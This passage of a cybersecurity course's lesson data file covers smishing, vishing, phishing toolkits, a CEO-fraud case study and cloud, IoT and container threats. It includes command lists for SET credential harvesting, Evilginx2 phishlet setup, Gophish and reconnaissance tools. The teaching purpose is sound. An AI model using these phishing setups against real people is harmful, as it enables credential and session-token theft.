              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Use only in legal security training and simulation.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Social Engineering Toolkit (SET)</h4>
                  <p class="text-gray-300 mb-4">Used to create phishing pages that can be delivered via SMS links.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch SET</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm">setoolkit</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Setup Phishing Page</h5>
                      <ul class="list-disc pl-4 text-sm text-gray-400 space-y-1">
                        <li>Select 2) Website Attack Vectors</li>
                        <li>Select 3) Credential Harvester Attack Method</li>
                        <li>Select 2) Site Cloner</li>
                        <li>Enter legitimate target URL (mobile-friendly site)</li>
                      </ul>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">View Results</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm">cat /root/.set/reports/*</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Evilginx2</h4>
                  <p class="text-gray-300 mb-4">Used for advanced phishing simulations with session capture (lab use only).</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">evilginx</code>
                        <code class="text-green-400 block font-mono text-sm">phishlets</code>
                        <code class="text-green-400 block font-mono text-sm">phishlets enable office365</code>
                        <code class="text-green-400 block font-mono text-sm">config domain smish-test.com</code>
                        <code class="text-green-400 block font-mono text-sm">phishlets hostname office365 login.smish-test.com</code>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Voice Phishing (Vishing)',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Voice Phishing (Vishing)</h2>
          <div class="space-y-4">
            <p class="text-gray-300">
              Vishing (Voice Phishing) is a social engineering attack carried out through phone calls or voice messages, where attackers impersonate trusted entities such as banks, technical support, law enforcement, or company executives to extract sensitive information. Unlike email or SMS phishing, vishing relies heavily on tone, authority, and real-time pressure. Attackers often spoof caller IDs and use scripted conversations to sound professional and convincing.
            </p>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 my-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Common Vishing Scenarios</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li>Fake bank fraud alerts</li>
                  <li>Technical support scams</li>
                  <li>Tax or legal threat calls</li>
                  <li>OTP and PIN extraction</li>
                  <li>HR or IT department impersonation</li>
                </ul>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Why Vishing is Effective</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li>Real-time interaction reduces victim thinking time</li>
                  <li>Voice builds trust and urgency</li>
                  <li>Caller ID spoofing appears legitimate</li>
                  <li>Less technical awareness among users</li>
                </ul>
              </div>
            </div>

            <div class="mb-6">
              <h3 class="text-lg font-semibold mb-3 text-white">Attack flow</h3>
              <ol class="list-decimal pl-5 space-y-2 text-gray-300">
                <li>Spoof caller ID.</li>
                <li>Create urgency or fear.</li>
                <li>Request verification details.</li>
                <li>Extract OTPs, PINs, or credentials.</li>
                <li>Perform financial or account compromise.</li>
              </ol>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
              <h3 class="text-lg font-semibold mb-2 text-white">Real-World Example</h3>
              <p class="text-gray-300">
                A victim receives a call claiming unauthorized bank activity and shares an OTP, leading to instant account takeover.
              </p>
            </div>
          </div>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tools for Vishing Simulation',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Use strictly for authorized awareness training and lab simulations.</p>
                </div>
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Social Engineering Toolkit (SET)</h4>
                  <p class="text-gray-300 mb-4">Used to prepare vishing scripts and pretext scenarios.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch SET & Select Human-Based Attacks</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">setoolkit</code>
                        <span class="text-gray-500 text-sm block ml-2"># Select Social Engineering Attacks (1)</span>
                        <span class="text-gray-500 text-sm block ml-2"># Choose Human-Based Attacks (3)</span>
                      </div>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Asterisk (VoIP Framework)</h4>
                  <p class="text-gray-300 mb-4">Used in lab environments for VoIP-based call simulations.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">service asterisk start</code>
                        <code class="text-green-400 block font-mono text-sm">asterisk -rvv</code>
                        <code class="text-green-400 block font-mono text-sm">sip show channels</code>
                        <code class="text-green-400 block font-mono text-sm">sip reload</code>
                        <code class="text-green-400 block font-mono text-sm">service asterisk stop</code>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Phishing Toolkits & Frameworks',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Phishing Toolkits & Frameworks</h2>
          <div class="space-y-4">
            <p class="text-gray-300">
              Phishing toolkits and frameworks are pre-built collections of scripts, templates, payloads, and automation utilities used to create, deploy, and manage phishing attacks. These tools lower the technical barrier, allowing attackers to launch highly convincing phishing campaigns with minimal effort. From a defensive and ethical hacking perspective, understanding these toolkits helps security professionals identify attack patterns, detect indicators of compromise (IOCs), and build better defenses.
            </p>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 my-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">What Frameworks Provide</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li>Pre-made phishing templates (bank, email, cloud logins)</li>
                  <li>Credential harvesting mechanisms</li>
                  <li>Email or link delivery automation</li>
                  <li>Logging and reporting dashboards</li>
                  <li>Session hijacking capabilities</li>
                </ul>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Why Attackers Use Them</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li>Faster attack setup</li>
                  <li>Professional-looking phishing pages</li>
                  <li>High success rate</li>
                  <li>Automation at scale</li>
                </ul>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
              <h3 class="text-lg font-semibold mb-2 text-white">Why Defenders Must Study Them</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300">
                <li>Recognize phishing infrastructure</li>
                <li>Understand attacker workflows</li>
                <li>Improve detection and response</li>
                <li>Design realistic awareness training</li>
              </ul>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
              <h3 class="text-lg font-semibold mb-2 text-white">Real-World Context</h3>
              <p class="text-gray-300">
                Major breaches start with phishing frameworks that harvest cloud credentials, later leading to ransomware or data exfiltration.
              </p>
            </div>
          </div>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tools for Phishing Simulation',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Strictly for authorized penetration testing, labs, and awareness training.</p>
                </div>
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Gophish</h4>
                  <p class="text-gray-300 mb-4">Enterprise-grade phishing awareness and testing framework.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">./gophish</code>
                        <code class="text-green-400 block font-mono text-sm">ps aux | grep gophish</code>
                        <code class="text-green-400 block font-mono text-sm"># Access admin dashboard at https://127.0.0.1:3333</code>
                        <code class="text-green-400 block font-mono text-sm">cat logs/gophish.log</code>
                        <code class="text-green-400 block font-mono text-sm">pkill gophish</code>
                      </div>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Evilginx2</h4>
                  <p class="text-gray-300 mb-4">Advanced framework for credential and session token capture.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">evilginx</code>
                        <code class="text-green-400 block font-mono text-sm">phishlets</code>
                        <code class="text-green-400 block font-mono text-sm">phishlets enable google</code>
                        <code class="text-green-400 block font-mono text-sm">config domain evil-lab.com</code>
                        <code class="text-green-400 block font-mono text-sm">phishlets hostname google login.evil-lab.com</code>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Real-World Case Study: The "CEO Fraud" Attack',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Real-World Case Study: The "CEO Fraud" Attack</h2>
          <div class="space-y-6">
            <p class="text-gray-300">
              Phishing isn't just about stealing credentials; it's also about stealing money directly through <strong>Business Email Compromise (BEC)</strong>. In this case study, we examine a classic "CEO Fraud" scenario to understand the psychology and mechanics behind it.
            </p>

            <div class="bg-[#1e1e1e] p-5 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-3">The Scenario</h3>
              <div class="space-y-4 text-gray-300">
                <p>
                  <strong>Target:</strong> The Chief Financial Officer (CFO) of a mid-sized company.
                </p>
                <p>
                  <strong>Attacker:</strong> Impersonating the CEO (Chief Executive Officer).
                </p>
                <div class="bg-black/30 p-4 rounded border-l-4 border-yellow-500 font-mono text-sm">
                  <p class="text-gray-400 mb-2">From: ceo-emaiI@company.com (Note the 'I' instead of 'l')</p>
                  <p class="text-gray-400 mb-4">Subject: URGENT: Vendor Payment Overdue</p>
                  <p>
                    Hi Sarah,<br><br>
                    I'm currently in a closed-door meeting with our new partners and can't take calls. We need to finalize the acquisition immediately, or we lose the deal.<br><br>
                    Please wire $45,000 to the attached vendor account details ASAP. I'll sign the paperwork when I step out. Let me know once it's done.<br><br>
                    Sent from my iPhone
                  </p>
                </div>
              </div>
            </div>

            <div>
              <h3 class="text-lg font-semibold text-white mb-3">Analysis: The Attack Vectors</h3>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h4 class="text-red-400 font-medium mb-2">1. Typosquatting</h4>
                  <p class="text-gray-400 text-sm">
                    The attacker registered <code class="text-gray-300">company.com</code> with a slight variation (e.g., swapping 'l' with 'I' or 'rn' for 'm'). Visually, it looks identical.
                  </p>
                </div>
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h4 class="text-red-400 font-medium mb-2">2. Psychology (Cialdini's Principles)</h4>
                  <ul class="text-gray-400 text-sm list-disc list-inside space-y-1">
                    <li><strong>Urgency:</strong> "ASAP", "lose the deal".</li>
                    <li><strong>Authority:</strong> Request comes from the CEO.</li>
                    <li><strong>Unavailability:</strong> "In a meeting", preventing verification.</li>
                  </ul>
                </div>
              </div>
            </div>

            <div>
              <h3 class="text-lg font-semibold text-white mb-3">What Went Wrong?</h3>
              <ul class="list-disc list-inside text-gray-300 space-y-2">
                <li>
                  <span class="text-red-400 font-semibold">No Out-of-Band Verification:</span> The CFO did not call the CEO to verify the request because the email said "can't take calls."
                </li>
                <li>
                  <span class="text-red-400 font-semibold">Lack of Email Auth:</span> The company did not have strict DMARC policies to block the spoofed domain.
                </li>
                <li>
                  <span class="text-red-400 font-semibold">Process Bypass:</span> The "urgent" nature caused the CFO to bypass standard approval workflows.
                </li>
              </ul>
            </div>

            <div class="bg-green-900/20 p-4 rounded border-l-4 border-green-500">
              <h3 class="text-lg font-semibold text-white mb-2">Lessons Learned & Mitigation</h3>
              <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm">
                <li><strong>Always Verify:</strong> Use a secondary channel (phone call, internal chat) for any fund transfer request.</li>
                <li><strong>Implement DMARC/SPF/DKIM:</strong> Prevent attackers from easily spoofing your domain.</li>
                <li><strong>Flag External Emails:</strong> Mark emails from outside the organization with a warning banner.</li>
                <li><strong>Slow Down:</strong> Urgency is a red flag. Security procedures exist for a reason.</li>
              </ul>
            </div>
          </div>
        `,
        duration: '15 min'
      }
    ]
  },
  {
    id: 'module-7',
    title: 'Module 7: Cloud, Mobile & IoT Security',
    duration: '1 week',
    description: 'Understand the security challenges in cloud environments, mobile devices, and IoT systems.',
    lessons: [
      {
        title: 'Introduction to Cloud & IoT Threats',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction to Cloud & IoT Threats</h2>
          <div class="space-y-4">
            <p class="text-gray-300">
              Cloud, Mobile, and IoT environments have transformed how modern systems operate, but they also introduce new attack surfaces and shared responsibility risks. Cloud threats arise because infrastructure is internet-facing, highly scalable, and often misconfigured. A single exposed storage bucket or weak API key can lead to massive data leaks.
            </p>
            <p class="text-gray-300">
              IoT threats exist due to limited device security, hardcoded credentials, outdated firmware, and lack of monitoring. Many IoT devices run continuously and are rarely patched. Mobile threats target operating systems, apps, and users through malicious apps, permission abuse, and insecure networks.
            </p>

            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 my-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Common Cloud Threats</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li>Misconfigured storage (public S3 buckets)</li>
                  <li>Weak IAM permissions</li>
                  <li>Exposed API keys</li>
                  <li>Insecure APIs</li>
                  <li>Shared responsibility misunderstandings</li>
                </ul>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Common IoT Threats</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li>Default credentials</li>
                  <li>Insecure firmware</li>
                  <li>Unencrypted communication</li>
                  <li>Botnet recruitment (e.g., Mirai)</li>
                </ul>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Common Mobile Threats</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li>Malicious apps</li>
                  <li>Excessive permissions</li>
                  <li>Insecure Wi-Fi usage</li>
                  <li>OS vulnerabilities</li>
                </ul>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
              <h3 class="text-lg font-semibold mb-2 text-white">Why These Threats Are Critical</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300">
                <li>Always connected to the internet</li>
                <li>Large-scale impact</li>
                <li>Often poorly monitored</li>
                <li>Direct access to sensitive data</li>
              </ul>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
              <h3 class="text-lg font-semibold mb-2 text-white">Real-World Example</h3>
              <p class="text-gray-300">
                A misconfigured cloud storage bucket exposes millions of user records publicly without authentication.
              </p>
            </div>
          </div>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tools for Cloud & IoT Reconnaissance',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Commands are for authorized labs and security assessments only.</p>
                </div>
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Nmap</h4>
                  <p class="text-gray-300 mb-4">Used to identify exposed cloud services and IoT devices.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">nmap 192.168.1.0/24</code>
                        <code class="text-green-400 block font-mono text-sm">nmap -sV 192.168.1.1</code>
                        <code class="text-green-400 block font-mono text-sm">nmap -p 21,22,23,80,443,1883 192.168.1.50</code>
                        <code class="text-green-400 block font-mono text-sm">nmap -O 192.168.1.1</code>
                        <code class="text-green-400 block font-mono text-sm">nmap -A 192.168.1.1</code>
                      </div>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Shodan (CLI)</h4>
                  <p class="text-gray-300 mb-4">Used to identify exposed cloud and IoT assets globally.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">shodan init YOUR_API_KEY</code>
                        <code class="text-green-400 block font-mono text-sm">shodan search "webcam"</code>
                        <code class="text-green-400 block font-mono text-sm">shodan search "Amazon S3"</code>
                        <code class="text-green-400 block font-mono text-sm">shodan host 8.8.8.8</code>
                        <code class="text-green-400 block font-mono text-sm">shodan download results.json "port:22 country:IN"</code>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Cloud Attack Vectors',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Cloud Attack Vectors</h2>
          <div class="space-y-4">
            <p class="text-gray-300">
              Cloud attack vectors are the paths attackers use to exploit weaknesses in cloud environments. Unlike traditional systems, cloud security failures often happen due to misconfiguration, weak identity management, and exposed APIs, not software vulnerabilities alone.
            </p>
            <p class="text-gray-300">
              Cloud operates under a shared responsibility model—providers secure the infrastructure, while customers are responsible for configurations, access control, and data security. Most cloud breaches occur due to customer-side mistakes.
            </p>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 my-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Common Cloud Attack Vectors</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Misconfigured storage:</strong> Publicly accessible storage buckets exposing sensitive data.</li>
                  <li><strong>Weak IAM policies:</strong> Over-permissive roles allowing attackers to escalate privileges.</li>
                  <li><strong>Exposed API keys and secrets:</strong> Hardcoded credentials in code repositories.</li>
                  <li><strong>Insecure APIs:</strong> APIs without authentication, rate limiting, or input validation.</li>
                  <li><strong>Compromised cloud accounts:</strong> Stolen credentials through phishing or credential stuffing.</li>
                  <li><strong>Metadata service abuse:</strong> Accessing cloud instance metadata to steal temporary credentials.</li>
                </ul>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Attack Flow Example</h3>
                <ol class="list-decimal pl-5 space-y-1 text-gray-300">
                  <li>Attacker finds exposed API key on GitHub.</li>
                  <li>Uses key to access cloud resources.</li>
                  <li>Enumerates permissions.</li>
                  <li>Escalates privileges.</li>
                  <li>Exfiltrates data or spins up crypto-mining instances.</li>
                </ol>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
              <h3 class="text-lg font-semibold mb-2 text-white">Key Takeaway</h3>
              <p class="text-gray-300">
                Cloud attacks mainly succeed through misconfiguration and identity abuse. Proper IAM controls, monitoring, and configuration audits are critical defenses.
              </p>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
              <h3 class="text-lg font-semibold mb-2 text-white">Real-World Example</h3>
              <p class="text-gray-300">
                An attacker discovers an exposed AWS access key and launches thousands of cloud instances, causing massive financial loss.
              </p>
            </div>
          </div>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tools for Cloud Security Assessment',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Use only in authorized cloud security labs.</p>
                </div>
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">ScoutSuite</h4>
                  <p class="text-gray-300 mb-4">Used for cloud security posture assessment.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">pip3 install scoutsuite</code>
                        <code class="text-green-400 block font-mono text-sm">scout aws</code>
                        <code class="text-green-400 block font-mono text-sm">scout azure</code>
                        <code class="text-green-400 block font-mono text-sm">scout aws --report-dir scout-report</code>
                        <code class="text-green-400 block font-mono text-sm">firefox scout-report/index.html</code>
                      </div>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Nuclei</h4>
                  <p class="text-gray-300 mb-4">Used to scan cloud assets for misconfigurations and exposures.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">nuclei -update-templates</code>
                        <code class="text-green-400 block font-mono text-sm">nuclei -u https://targetcloud.com</code>
                        <code class="text-green-400 block font-mono text-sm">nuclei -u https://targetcloud.com -t cloud/</code>
                        <code class="text-green-400 block font-mono text-sm">nuclei -u https://targetcloud.com -s critical,high</code>
                        <code class="text-green-400 block font-mono text-sm">nuclei -u https://targetcloud.com -o cloud_scan.txt</code>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Vulnerabilities in Cloud Platforms',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Vulnerabilities in Cloud Platforms</h2>
          <div class="space-y-4">
            <p class="text-gray-300">
              Cloud platforms introduce unique vulnerabilities that differ from traditional on-premise systems. Most cloud vulnerabilities arise from configuration errors, weak identity controls, insecure APIs, and misunderstanding of shared responsibility. Unlike local servers, cloud services are internet-exposed by default, making even small mistakes highly dangerous.
            </p>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 my-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Common Cloud Platform Vulnerabilities</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Misconfigured storage services:</strong> Storage buckets or blobs made public unintentionally, exposing sensitive data.</li>
                  <li><strong>Over-privileged IAM roles:</strong> Users or services granted excessive permissions beyond their requirements.</li>
                  <li><strong>Insecure APIs and endpoints:</strong> APIs lacking authentication, authorization, or proper input validation.</li>
                  <li><strong>Lack of encryption:</strong> Data stored or transmitted without encryption at rest or in transit.</li>
                  <li><strong>Metadata service exposure:</strong> Attackers abuse cloud metadata endpoints to steal temporary credentials.</li>
                  <li><strong>Weak monitoring and logging:</strong> Delayed detection of malicious activities and breaches.</li>
                </ul>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Attack Flow Example</h3>
                <ol class="list-decimal pl-5 space-y-1 text-gray-300">
                  <li>Attacker scans for open cloud services.</li>
                  <li>Identifies misconfigured permissions.</li>
                  <li>Extracts access tokens or credentials.</li>
                  <li>Moves laterally across cloud services.</li>
                  <li>Steals or deletes sensitive data.</li>
                </ol>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
              <h3 class="text-lg font-semibold mb-2 text-white">Key Takeaway</h3>
              <p class="text-gray-300">
                Most cloud platform vulnerabilities are self-inflicted. Strong IAM controls, encryption, logging, and continuous monitoring are essential for cloud security.
              </p>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
              <h3 class="text-lg font-semibold mb-2 text-white">Real-World Example</h3>
              <p class="text-gray-300">
                A public cloud database without authentication leaks millions of customer records.
              </p>
            </div>
          </div>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tools for Cloud Security Testing',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Commands are for authorized cloud security testing only.</p>
                </div>
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">CloudSploit</h4>
                  <p class="text-gray-300 mb-4">Used to detect cloud security misconfigurations.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">git clone https://github.com/aquasecurity/cloudsploit.git</code>
                        <code class="text-green-400 block font-mono text-sm">cd cloudsploit</code>
                        <code class="text-green-400 block font-mono text-sm">npm install</code>
                        <code class="text-green-400 block font-mono text-sm">node index.js --cloud aws</code>
                        <code class="text-green-400 block font-mono text-sm">node index.js --cloud aws --output json > aws_vuln_report.json</code>
                      </div>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Prowler</h4>
                  <p class="text-gray-300 mb-4">Used for AWS security best-practice assessments.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">git clone https://github.com/prowler-cloud/prowler.git</code>
                        <code class="text-green-400 block font-mono text-sm">cd prowler</code>
                        <code class="text-green-400 block font-mono text-sm">./prowler</code>
                        <code class="text-green-400 block font-mono text-sm">./prowler -g cis</code>
                        <code class="text-green-400 block font-mono text-sm">./prowler -M html</code>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Attacking Containers & Virtual Machines',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Attacking Containers & Virtual Machines</h2>
          <div class="space-y-4">
            <p class="text-gray-300">
              Containers and Virtual Machines (VMs) are core components of modern cloud infrastructure. While they provide isolation and scalability, misconfiguration and weak runtime security can allow attackers to escape isolation or compromise entire environments.
            </p>
            <p class="text-gray-300">
              Containers share the host OS kernel, making them lightweight but potentially vulnerable if isolation is weak. Virtual Machines provide stronger isolation but are still vulnerable through misconfigurations, exposed services, and unpatched software.
            </p>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 my-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Common Container Attack Vectors</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Container escape:</strong> Exploiting vulnerabilities to access the host OS.</li>
                  <li><strong>Insecure container images:</strong> Images with embedded secrets or outdated packages.</li>
                  <li><strong>Exposed Docker APIs:</strong> Docker daemon exposed without authentication.</li>
                  <li><strong>Weak runtime controls:</strong> Containers running as root.</li>
                </ul>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Common VM Attack Vectors</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li>Exposed management ports (SSH, RDP)</li>
                  <li>Snapshot theft</li>
                  <li>Hypervisor vulnerabilities</li>
                  <li>Misconfigured security groups</li>
                </ul>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
              <h3 class="text-lg font-semibold mb-2 text-white">Attack Flow Example</h3>
              <ol class="list-decimal pl-5 space-y-1 text-gray-300">
                <li>Attacker discovers exposed container service.</li>
                <li>Gains shell access to container.</li>
                <li>Enumerates host resources.</li>
                <li>Escapes container or pivots to other services.</li>
                <li>Compromises entire cloud workload.</li>
              </ol>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
              <h3 class="text-lg font-semibold mb-2 text-white">Real-World Example</h3>
              <p class="text-gray-300">
                A publicly exposed Docker API allowed attackers to deploy crypto-mining containers across cloud infrastructure.
              </p>
            </div>
          </div>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tools for Container & VM Security',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Use strictly in authorized labs and cloud environments.</p>
                </div>
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Docker CLI (Container Enumeration)</h4>
                  <p class="text-gray-300 mb-4">Standard tool for managing and inspecting containers.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">docker ps</code>
                        <code class="text-green-400 block font-mono text-sm">docker ps -a</code>
                        <code class="text-green-400 block font-mono text-sm">docker inspect container_id</code>
                        <code class="text-green-400 block font-mono text-sm">docker exec -it container_id /bin/bash</code>
